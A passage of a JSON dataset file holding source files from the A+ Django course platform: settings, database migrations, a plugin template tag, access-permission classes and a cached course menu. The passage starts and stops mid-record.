'SHIB_sn'\n#SHIB_MAIL_KEY = 'SHIB_mail'\n#SHIB_STUDENT_ID_KEY = 'SHIB_schacPersonalUniqueCode'\n\n\n## Google OAuth2 settings\n\n#INSTALLED_APPS += ('social_django',)\n#SOCIAL_AUTH_GOOGLE_OAUTH2_KEY = ''\n#SOCIAL_AUTH_GOOGLE_OAUTH2_SECRET = ''\nSOCIAL_AUTH_URL_NAMESPACE = 'social'\nSOCIAL_AUTH_USERNAME_IS_FULL_EMAIL = True\n\n##########################################################################\n\nMIDDLEWARE_CLASSES = (\n    'django.middleware.security.SecurityMiddleware',\n    'django.contrib.sessions.middleware.SessionMiddleware',\n    'django.middleware.csrf.CsrfViewMiddleware',\n    'django.middleware.clickjacking.XFrameOptionsMiddleware',\n    'lib.middleware.SqlInjectionMiddleware',\n    'django.contrib.auth.middleware.AuthenticationMiddleware',\n    'django.contrib.auth.middleware.SessionAuthenticationMiddleware',\n    'django.middleware.locale.LocaleMiddleware',\n    'django.middleware.common.CommonMiddleware',\n    'social_django.middleware.SocialAuthExceptionMiddleware',\n    'django.contrib.messages.middleware.MessageMiddleware',\n)\n\nROOT_URLCONF = 'aplus.urls'\nLOGIN_REDIRECT_URL = \"/\"\nLOGIN_ERROR_URL = \"/accounts/login/\"\n\nTEMPLATES = [\n    {\n        'BACKEND': 'django.template.backends.django.DjangoTemplates',\n        'DIRS': [\n            join(BASE_DIR, 'local_templates'),\n            join(BASE_DIR, 'templates'),\n        ],\n        'APP_DIRS': True,\n        'OPTIONS': {\n            'context_processors': [\n                \"django.contrib.auth.context_processors.auth\",\n                \"django.template.context_processors.debug\",\n                'django.template.context_processors.request',\n                \"django.template.context_processors.i18n\",\n                \"django.template.context_processors.media\",\n                \"django.template.context_processors.static\",\n                \"django.contrib.messages.context_processors.messages\",\n            ],\n        },\n    },\n]\n\nFILE_UPLOAD_HANDLERS = (\n    #\"django.core.files.uploadhandler.MemoryFileUploadHandler\",\n    \"django.core.files.uploadhandler.TemporaryFileUploadHandler\",\n)\n\nWSGI_APPLICATION = 'aplus.wsgi.application'\n\n\n# Database (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/ref/settings/#databases\n##########################################################################\nDATABASES = {\n    'default': {\n        'ENGINE': 'django.db.backends.sqlite3', # Add 'postgresql_psycopg2', 'postgresql', 'mysql', 'sqlite3' or 'oracle'.\n        'NAME': join(BASE_DIR, 'aplus.db'), # Or path to database file if using sqlite3.\n        'USER': '', # Not used with sqlite3.\n        'PASSWORD': '', # Not used with sqlite3.\n        'HOST': '', # Set to empty string for localhost. Not used with sqlite3.\n        'PORT': '', # Set to empty string for default. Not used with sqlite3.\n    }\n}\n##########################################################################\n\n# Cache (override in local_settings.py)\n# https://docs.djangoproject.com/en/1.10/topics/cache\n##########################################################################\nCACHES = {\n    'default': {\n        'BACKEND': 'lib.cache.backends.LocMemCache',\n        'TIMEOUT': None,\n        'OPTIONS': {'MAX_SIZE': 1000000}, # simulate memcached value limit\n    }\n}\n#SESSION_ENGINE = 'django.contrib.sessions.backends.cached_db'\n##########################################################################\n\n# Internationalization (may override in local_settings.py)\n# https://docs.djangoproject.com/en/1.7/topics/i18n/\nLANGUAGE_CODE = 'en-gb'\nLANGUAGES = [\n    ('en', 'English'),\n    ('fi', 'Finnish'),\n]\nTIME_ZONE = 'EET'\nUSE_I18N = True\nUSE_L10N = True\nUSE_TZ = True\nFORMAT_MODULE_PATH = 'aplus'\nLOCALE_PATHS = (\n    join(BASE_DIR, 'locale'),\n)\n\n# Static files (CSS, JavaScript, Images)\n# https://docs.djangoproject.com/en/1.7/howto/static-files/\nSTATICFILES_STORAGE = 'lib.storage.BumpStaticFilesStorage'\nSTATICFILES_DIRS = (\n    join(BASE_DIR, 'assets'),\n)\nSTATIC_URL = '/static/'\nSTATIC_ROOT = join(BASE_DIR, 'static')\n\nMEDIA_URL = '/media/'\nMEDIA_ROOT = join(BASE_DIR, 'media')\n\n# Django REST Framework settings\n# http://www.django-rest-framework.org/api-guide/settings/\nREST_FRAMEWORK = {\n    'DEFAULT_AUTHENTICATION_CLASSES': (\n        # Clients should use token for authentication\n        # Requires rest_framework.authtoken in apps.\n        'rest_framework.authentication.TokenAuthentication',\n        'lib.api.authentication.grader.GraderAuthentication',\n        'rest_framework.authentication.SessionAuthentication',\n    ),\n    'DEFAULT_PERMISSION_CLASSES': (\n        # If not other permissions are defined, require login.\n        'rest_framework.permissions.IsAuthenticated',\n        'userprofile.permissions.GraderUserCanOnlyRead',\n    ),\n    'DEFAULT_RENDERER_CLASSES': (\n        'lib.api.core.APlusJSONRenderer',\n        'rest_framework.renderers.BrowsableAPIRenderer',\n    ),\n    'DEFAULT_CONTENT_NEGOTIATION_CLASS': 'lib.api.core.APlusContentNegotiation',\n    'DEFAULT_VERSIONING_CLASS': 'lib.api.core.APlusVersioning',\n    'PAGE_SIZE': 100,\n    'DEFAULT_VERSION': '2',\n    'ALLOWED_VERSIONS': {\n        # These are really just latest versions\n        '1': '1.0',\n        '2': '2.0',\n    },\n}\n\n\n# Test environment url fixes are implemented using these. Typically not required for production\nOVERRIDE_SUBMISSION_HOST = None\nREMOTE_PAGE_HOSTS_MAP = None\n\n# Maximum submissions limit for exercises that allow unofficial submissions.\n# The exercise-specific max submissions limit may then be exceeded, however,\n# this limit will prevent students from spamming massive amounts of submissions.\n# Set this value to zero in order to remove the limit.\nMAX_UNOFFICIAL_SUBMISSIONS = 200\n\n# Testing\n# https://docs.djangoproject.com/en/1.7/topics/testing/advanced/\nTEST_RUNNER = \"xmlrunner.extra.djangotestrunner.XMLTestRunner\"\nTEST_OUTPUT_VERBOSE = True\nTEST_OUTPUT_DESCRIPTIONS = True\nTEST_OUTPUT_DIR = \"test_results\"\n\n# Logging\n# https://docs.djangoproject.com/en/1.7/topics/logging/\nfrom lib.logging import skip_unreadable_post\nLOGGING = {\n  'version': 1,\n  'disable_existing_loggers': False,\n  'formatters': {\n    'verbose': {\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s'\n    },\n    'colored': {\n      '()': 'r_django_essentials.logging.SourceColorizeFormatter',\n      'format': '[%(asctime)s: %(levelname)s/%(module)s] %(message)s',\n      'colors': {\n        'django.db.backends': {'fg': 'cyan'},\n        'django.db.deferred': {'fg': 'yellow'},\n        'cached': {'fg': 'red'},\n      },\n    },\n  },\n  'filters': {\n    'skip_unreadable_post': {\n        '()': 'django.utils.log.CallbackFilter',\n        'callback': skip_unreadable_post,\n    },\n    'require_debug_true': {\n      '()': 'django.utils.log.RequireDebugTrue',\n    },\n    'require_debug_false': {\n      '()': 'django.utils.log.RequireDebugFalse',\n    },\n  },\n  'handlers': {\n    'debug_console': {\n      'level': 'DEBUG',\n      'filters': ['require_debug_true'],\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'colored',\n    },\n    'console': {\n      'level': 'DEBUG',\n      'class': 'logging.StreamHandler',\n      'stream': 'ext://sys.stdout',\n      'formatter': 'verbose',\n    },\n    'email': {\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n    'mail_admins': {\n      # Duplicate of above, so if django internally refers it, we will use our filters\n      'level': 'ERROR',\n      'filters': ['require_debug_false', 'skip_unreadable_post'],\n      'class': 'django.utils.log.AdminEmailHandler',\n    },\n  },\n  'loggers': {\n    '': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n      'propagate': True\n    },\n    # Django defines these loggers internally, so we need to reconfigure them.\n    'django': {\n      'level': 'INFO',\n      'handlers': ['console', 'email'],\n    },\n    'py.warnings': {\n      'handlers': ['console'],\n    },\n  },\n}\n\n\n\n\n\n###############################################################################\n#\n# Logic to load settings from other files and tune them based on DEBUG\n#\nfrom os import environ\nfrom r_django_essentials.conf import *\n\n# Load settings from: local_settings, secret_key and environment\nupdate_settings_with_file(__name__,\n                          environ.get('APLUS_LOCAL_SETTINGS', 'local_settings'),\n                          quiet='APLUS_LOCAL_SETTINGS' in environ)\nupdate_settings_from_environment(__name__, 'DJANGO_') # FIXME: deprecated. was used with containers before, so keep it here for now.\nupdate_settings_from_environment(__name__, 'APLUS_')\nupdate_secret_from_file(__name__, environ.get('APLUS_SECRET_KEY_FILE', 'secret_key'))\n\n# Complain if BASE_URL is not set\ntry:\n    if not BASE_URL:\n        raise RuntimeError('Local setting BASE_URL should be non-empty')\nexcept NameError as e:\n    raise RuntimeError('BASE_URL must be specified in local settings') from e\n\n# update INSTALLED_APPS\nif 'INSTALLED_LOGIN_APPS' in globals():\n    INSTALLED_APPS = INSTALLED_LOGIN_APPS + INSTALLED_APPS\n\n# update template loaders for production\nuse_cache_template_loader_in_production(__name__)\n\n# setup authentication backends based on installed_apps\nSOCIAL_AUTH = False\nAUTHENTICATION_BACKENDS = (\n    'django.contrib.auth.backends.ModelBackend',\n)\nif 'shibboleth_login' in INSTALLED_APPS:\n    AUTHENTICATION_BACKENDS += ('shibboleth_login.auth_backend.ShibbolethAuthBackend',)\nif 'social_django' in INSTALLED_APPS:\n    SOCIAL_AUTH = True\n    AUTHENTICATION_BACKENDS += ('social_core.backends.google.GoogleOAuth2',)\n\n\n\nif DEBUG:\n    # Allow basic auth for API when DEBUG is on\n    REST_FRAMEWORK['DEFAULT_AUTHENTICATION_CLASSES'] += ('rest_framework.authentication.BasicAuthentication',)\n    # Enable defer logging\n    from lib.models import install_defer_logger\n    install_defer_logger()\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/apps/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('contenttypes', '0001_initial'),\n        ('inheritance', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='BasePlugin',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('title', models.CharField(max_length=64)),\n                ('views', models.CharField(blank=True, max_length=255)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='BaseTab',\n            fields=[\n                ('modelwithinheritance_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='inheritance.ModelWithInheritance')),\n                ('container_pk', models.TextField(verbose_name='object ID')),\n                ('label', models.CharField(max_length=12)),\n                ('title', models.CharField(max_length=64)),\n                ('order', models.IntegerField(default=100)),\n                ('opening_method', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'ordering': ['order', 'id'],\n            },\n            bases=('inheritance.modelwithinheritance',),\n        ),\n        migrations.CreateModel(\n            name='EmbeddedTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content_url', models.URLField(max_length=128)),\n                ('element_id', models.CharField(blank=True, max_length=32)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFramePlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('service_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='ExternalIFrameTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content_url', models.URLField(max_length=255)),\n                ('width', models.IntegerField()),\n                ('height', models.IntegerField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='HTMLPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.CreateModel(\n            name='HTMLTab',\n            fields=[\n                ('basetab_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BaseTab')),\n                ('content', models.TextField()),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.basetab',),\n        ),\n        migrations.CreateModel(\n            name='RSSPlugin',\n            fields=[\n                ('baseplugin_ptr', models.OneToOneField(parent_link=True, auto_created=True, primary_key=True, serialize=False, to='apps.BasePlugin')),\n                ('feed_url', models.URLField(max_length=256)),\n            ],\n            options={\n                'abstract': False,\n            },\n            bases=('apps.baseplugin',),\n        ),\n        migrations.AddField(\n            model_name='basetab',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType'),\n            preserve_default=True,\n        ),\n        migrations.AddField(\n            model_name='baseplugin',\n            name='container_type',\n            field=models.ForeignKey(to='contenttypes.ContentType'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/apps/templatetags/apps.py",
        "source": "import logging\n\nfrom django import template\n\nfrom apps.app_renderers import build_plugin_renderers\nfrom course.models import CourseInstance\nfrom exercise.exercise_models import BaseExercise\nfrom exercise.submission_models import Submission\n\n\nlogger = logging.getLogger(\"aplus.apps\")\nregister = template.Library()\n\n\n@register.assignment_tag\ndef plugin_renderers(user, some_model, view_name=None):\n    \"\"\"\n    Builds the plugin renderers for a view.\n    \"\"\"\n    profile = user.userprofile if user.is_authenticated() else None\n    if isinstance(some_model, CourseInstance):\n        return build_plugin_renderers(\n            some_model.plugins.all(),\n            view_name or \"course_instance\",\n            user_profile=profile,\n            course_instance=some_model,\n        )\n    if isinstance(some_model, BaseExercise):\n        course_instance = some_model.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"exercise\",\n            user_profile=profile,\n            exercise=some_model,\n            course_instance=course_instance,\n        )\n    if isinstance(some_model, Submission):\n        course_instance = some_model.exercise.course_instance\n        return build_plugin_renderers(\n            course_instance.plugins.all(),\n            view_name or \"submission\",\n            user_profile=profile,\n            submission=some_model,\n            exercise=some_model.exercise,\n            course_instance=course_instance,\n        )\n    logger.warn(\"Unrecognized model type received for plugin_renderers tag: {}\" \\\n                .format(str(type(some_model))))\n    return []\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/authorization/permissions.py",
        "source": "from django.utils.translation import string_concat, ugettext_lazy as _\n\ntry:\n    from django.utils.text import format_lazy\nexcept ImportError: # implemented in Django 1.11\n    from django.utils.functional import lazy as _lazy\n    def _format_lazy(format_string, *args, **kwargs):\n        return format_string.format(*args, **kwargs)\n    format_lazy = _lazy(_format_lazy, str)\n\nfrom lib.helpers import Enum\n\n\"\"\"\nBase permission classes.\n\nThese classes use same interface than ones in django-rest-framework and\nare usable with APIViews too. We define our superclass so we don't need to\ndepend on django-rest-framework.\n\"\"\"\n\n\nSAFE_METHODS = ('GET', 'HEAD', 'OPTIONS')\n\n\nclass FilterBackend(object):\n    \"\"\"\n    FilterBackend interface\n    \"\"\"\n    def filter_queryset(self, request, queryset, view):\n        \"\"\"\n        Return a filtered queryset.\n        \"\"\"\n        raise NotImplementedError\n\n    def get_fields(self, view):\n        return []\n\n\nclass Permission(object):\n    \"\"\"\n    Permission interface\n    \"\"\"\n    def has_permission(self, request, view):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n    def has_object_permission(self, request, view, obj):\n        \"\"\"\n        Return `True` if permission is granted, `False` otherwise.\n        \"\"\"\n        return True\n\n\nclass NoPermission(Permission):\n    \"\"\"\n    Base Permission class that gives no access permission to anyone.\n    \"\"\"\n    def has_permission(self, request, view):\n        return False\n\n    def has_object_permission(self, request, view, obj):\n        return False\n\n\nclass MessageMixin(object):\n    \"\"\"\n    Adds easy way to specify what exactly caused the PermissionDenied\n    \"\"\"\n    def error_msg(self, message: str, delim=None, format=None, replace=False):\n        \"\"\"\n        Add extra text to self.message about the reason why permission\n        was denied. Uses lazy object so the message string is evaluated\n        only when rendered.\n\n        If optional argument `format` is given, then it's used with format_lazy\n        to format the message with the dictionary arguments from `format` arg.\n\n        Optional argument `delim` can be used to change the string used to join\n        self.message and `message`.\n\n        If optional argument `replace` is true, then self.message is replaced with\n        the `message`.\n        \"\"\"\n        if delim is None:\n            delim = ': '\n\n        if format:\n            message = format_lazy(message, **format)\n\n        if replace:\n            self.message = message\n        else:\n            assert 'message' not in self.__dict__, (\n                \"You are calling error_msg without replace=True \"\n                \"after calling it with it firts. Fix your code by removing \"\n                \"firts method call add replace=True to second method call too.\"\n            )\n            self.message = string_concat(self.message, delim, message)\n\n\n# Access mode\n# ===========\n\n# All access levels\nACCESS = Enum(\n    ('ANONYMOUS', 0, _(\"Any user authenticated or not\")),\n    ('ENROLL', 1, None),\n    ('STUDENT', 3, _(\"Any authenticated student\")),\n    ('ENROLLED', 4, _(\"Enrolled student of the course\")),\n    ('ASSISTANT', 5, _(\"Assistant of the course\")),\n    ('GRADING', 6, _(\"Grading. Assistant if course has that option or teacher\")),\n    ('TEACHER', 10, _(\"Teacher of the course\")),\n    ('SUPERUSER', 100, _(\"Superuser of the service\")),\n)\n\n\nclass AccessModePermission(MessageMixin, Permission):\n    \"\"\"\n    If view has access_mode that is not anonymous, then require authentication\n    \"\"\"\n    message = _(\"Permission denied by access mode.\")\n\n    def has_permission(self, request, view):\n        access_mode = view.get_access_mode()\n\n        if access_mode == ACCESS.ANONYMOUS:\n            return True\n        if not request.user.is_authenticated():\n            return False\n\n        if access_mode >= ACCESS.SUPERUSER:\n            return request.user.is_superuser\n\n        if access_mode >= ACCESS.TEACHER:\n            if not view.is_teacher:\n                self.error_msg(_(\"Only course teachers shall pass.\"))\n                return False\n\n        elif access_mode >= ACCESS.ASSISTANT:\n            if not view.is_course_staff:\n                self.error_msg(_(\"Only course staff shall pass.\"))\n                return False\n\n        elif access_mode == ACCESS.ENROLLED:\n            if not view.is_course_staff and not view.is_student:\n                self.error_msg(_(\"Only enrolled students shall pass.\"))\n                return False\n\n        return True\n\n\n# Object permissions\n# ==================\n\n\nclass ObjectVisibleBasePermission(MessageMixin, Permission):\n    model = None\n    obj_var = None\n\n    def has_permission(self, request, view):\n        obj = getattr(view, self.obj_var, None)\n        return (\n            obj is None or\n            self.has_object_permission(request, view, obj)\n        )\n\n    def has_object_permission(self, request, view, obj):\n        user = request.user\n        return (\n            not isinstance(obj, self.model) or # skip objects that are not model in question\n            user.is_staff or\n            user.is_superuser or\n            self.is_object_visible(request, view, obj)\n        )\n\n    def is_object_visible(self, request, view, obj):\n        raise NotImplementedError\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/cache/menu.py",
        "source": "from django.db.models.signals import post_save, post_delete, m2m_changed\nfrom django.utils import timezone\n\nfrom lib.cache import CachedAbstract\nfrom ..models import StudentGroup, Enrollment, CourseInstance, Course\nfrom ..renders import render_group_info\n\n\nclass CachedTopMenu(CachedAbstract):\n    KEY_PREFIX = 'topmenu'\n\n    def __init__(self, user):\n        self.user = user\n        super().__init__(user)\n\n    def _generate_data(self, user, data=None):\n        profile = user.userprofile if user and user.is_authenticated() else None\n        return {\n            'courses': self._generate_courses(profile),\n            'groups': self._generate_groups(profile),\n        }\n\n    def _generate_courses(self, profile):\n        if not profile:\n            return []\n\n        def course_entry(instance):\n            return {\n                'name': str(instance),\n                'link': instance.get_absolute_url(),\n            }\n        def divider_entry():\n            return {\n                'divider': True,\n            }\n\n        enrolled = []\n        for instance in profile.enrolled.all():\n            enrolled.append(course_entry(instance))\n\n        teaching = []\n        for course in profile.teaching_courses.all():\n            for instance in course.instances.all():\n                teaching.append(course_entry(instance))\n\n        assisting = []\n        for instance in profile.assisting_courses.all():\n            assisting.append(course_entry(instance))\n\n        courses = []\n        courses.extend(enrolled)\n        if courses and teaching:\n            courses.append(divider_entry())\n        courses.extend(teaching)\n        if courses and assisting:\n            courses.append(divider_entry())\n        courses.extend(assisting)\n        return courses\n\n    def _generate_groups(self, profile):\n        if not profile:\n            return {}\n\n        def group_entry(group):\n            return {\n                'id': group.id,\n                'size': group.members.count(),\n                'collaborators': group.collaborator_names(profile),\n            }\n\n        group_map = {}\n        for enrollment in Enrollment.objects\\\n                .filter(user_profile=profile)\\\n                .select_related('selected_group')\\\n                .prefetch_related('selected_group__members'):\n            instance_id = enrollment.course_instance_id\n            group_map[instance_id] = (\n                [\n                    group_entry(g) for g in profile.groups\\\n                        .filter(course_instance_id=instance_id)\\\n                        .prefetch_related('members')\n                ],\n                render_group_info(enrollment.selected_group, profile)\n            )\n        return group_map\n\n    def courses(self):\n        return self.data['courses']\n\n    def groups(self, instance):\n        return self.data['groups'].get(instance.id, ([],None))\n\n\ndef invalidate_content(sender, instance, **kwargs):\n    CachedTopMenu.invalidate(instance.user_profile.user)\n\ndef invalidate_assistants(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.assistants.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_teachers(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.teachers.all():\n            CachedTopMenu.invalidate(profile.user)\n\ndef invalidate_members(sender, instance, reverse=False, **kwargs):\n    if reverse:\n        CachedTopMenu.invalidate(instance.user)\n    else:\n        for profile in instance.members.all():\n            CachedTopMenu.invalidate(profile.user)\n\n\n# Automatically invalidate cached menu when enrolled or edited.\npost_save.connect(invalidate_content, sender=Enrollment)\npost_delete.connect(invalidate_content, sender=Enrollment)\nm2m_changed.connect(invalidate_assistants, sender=CourseInstance.assistants.through)\nm2m_changed.connect(invalidate_teachers, sender=Course.teachers.through)\nm2m_changed.connect(invalidate_members, sender=StudentGroup.members.through)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0001_initial.py",
        "source": "# -*- coding: utf-8 -*-\n\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('userprofile', '0001_initial'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='Course',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('name', models.CharField(max_length=255)),\n                ('code', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text=b\"Input an identifier for this course's URL.\", unique=True, max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('teachers', models.ManyToManyField(related_name='teaching_courses', to='userprofile.UserProfile', blank=True)),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseHook',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('hook_url', models.URLField()),\n                ('hook_type', models.CharField(default=b'post-grading', max_length=12, choices=[(b'post-grading', b'Post grading')])),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='CourseInstance',\n            fields=[\n                ('id', models.AutoField(verbose_name='ID', serialize=False, auto_created=True, primary_key=True)),\n                ('instance_name', models.CharField(max_length=255)),\n                ('website', models.URLField(max_length=255, blank=True)),\n                ('url', models.CharField(help_text=b'Input an URL identifier for this course.', max_length=255, validators=[django.core.validators.RegexValidator(regex=b'^[\\\\w\\\\-\\\\.]*$')])),\n                ('starting_time', models.DateTimeField()),\n                ('ending_time', models.DateTimeField()),\n                ('visible_to_students', models.BooleanField(default=True)),\n                ('assistants', models.ManyToManyField(related_name='assisting_courses', to='userprofile.UserProfile', blank=True)),\n                ('course', models.ForeignKey(related_name='instances', to='course.Course')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='courseinstance',\n            unique_together=set([('course', 'url')]),\n        ),\n        migrations.AddField(\n            model_name='coursehook',\n            name='course_instance',\n            field=models.ForeignKey(related_name='course_hooks', to='course.CourseInstance'),\n            preserve_default=True,\n        ),\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0005_auto_20150625_1835.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.utils.timezone\nimport lib.fields\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('exercise', '0006_auto_20150625_1823'),\n        ('userprofile', '0002_auto_20150427_1717'),\n        ('inheritance', '0001_initial'),\n        ('course', '0004_auto_20150625_1821'),\n    ]\n\n    state_operations = [\n        migrations.CreateModel(\n            name='CourseModule',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(max_length=255, validators=[django.core.validators.RegexValidator(regex='^(?!teachers$)(?!user$)[\\\\w\\\\-\\\\.]*$')], help_text='Input an URL identifier for this module. Taken words include: teachers, user')),\n                ('chapter', models.IntegerField(default=1)),\n                ('subchapter', models.IntegerField(default=1)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('introduction', models.TextField(blank=True)),\n                ('opening_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('closing_time', models.DateTimeField(default=django.utils.timezone.now)),\n                ('content_url', models.URLField(blank=True)),\n                ('late_submissions_allowed', models.BooleanField(default=False)),\n                ('late_submission_deadline', models.DateTimeField(default=django.utils.timezone.now)),\n                ('late_submission_penalty', lib.fields.PercentField(default=0.5, help_text='Multiplier of points to reduce, as decimal. 0.1 = 10%')),\n                ('course_instance', models.ForeignKey(related_name='course_modules', to='course.CourseInstance')),\n            ],\n            options={\n                'ordering': ['closing_time', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.CreateModel(\n            name='LearningObjectCategory',\n            fields=[\n                ('id', models.AutoField(primary_key=True, serialize=False, auto_created=True, verbose_name='ID')),\n                ('name', models.CharField(max_length=35)),\n                ('description', models.TextField(blank=True)),\n                ('points_to_pass', models.PositiveIntegerField(default=0)),\n                ('course_instance', models.ForeignKey(related_name='categories', to='course.CourseInstance')),\n                ('hidden_to', models.ManyToManyField(blank=True, related_name='hidden_categories', null=True, to='userprofile.UserProfile')),\n            ],\n            options={\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='learningobjectcategory',\n            unique_together=set([('name', 'course_instance')]),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursemodule',\n            unique_together=set([('course_instance', 'url')]),\n        ),\n    ]\n\n    operations = [\n        migrations.SeparateDatabaseAndState(state_operations=state_operations)\n    ]\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Aalto-LeTech/a-plus/blob/e90b78565cf2d4f99b44b38424eb5b85b8a055fe",
        "file_path": "/course/migrations/0006_auto_20150721_1152.py",
        "source": "# -*- coding: utf-8 -*-\nfrom __future__ import unicode_literals\n\nfrom django.db import models, migrations\nimport django.core.validators\n\n\nclass Migration(migrations.Migration):\n\n    dependencies = [\n        ('course', '0005_auto_20150625_1835'),\n    ]\n\n    operations = [\n        migrations.CreateModel(\n            name='CourseChapter',\n            fields=[\n                ('id', models.AutoField(auto_created=True, primary_key=True, verbose_name='ID', serialize=False)),\n                ('order', models.IntegerField(default=1)),\n                ('name', models.CharField(max_length=255)),\n                ('url', models.CharField(help_text='Input an URL identifier for this chapter.', validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255)),\n                ('content_url', models.URLField(help_text='The resource to show.')),\n                ('course_module', models.ForeignKey(related_name='chapters', to='course.CourseModule')),\n            ],\n            options={\n                'ordering': ['course_module', 'order', 'id'],\n            },\n            bases=(models.Model,),\n        ),\n        migrations.AlterUniqueTogether(\n            name='coursechapter',\n            unique_together=set([('course_module', 'url')]),\n        ),\n        migrations.AlterModelOptions(\n            name='coursemodule',\n            options={'ordering': ['closing_time', 'order', 'id']},\n        ),\n        migrations.RenameField(\n            model_name='coursemodule',\n            old_name='chapter',\n            new_name='order',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='content_url',\n        ),\n        migrations.RemoveField(\n            model_name='coursemodule',\n            name='subchapter',\n        ),\n        migrations.AlterField(\n            model_name='course',\n            name='url',\n            field=models.CharField(unique=True, validators=[django.core.validators.RegexValidator(regex='^[\\\\w\\\\-\\\\.]*$')], max_length=255, help_text='Input an URL identifier for this course.'),\n            preserve_default=True,\n        ),\n        migrations.AlterField(\n            model_name='coursemodule',\n            name='url',\n            field=models.CharField(help_text='Input an URL identifier for this module.', 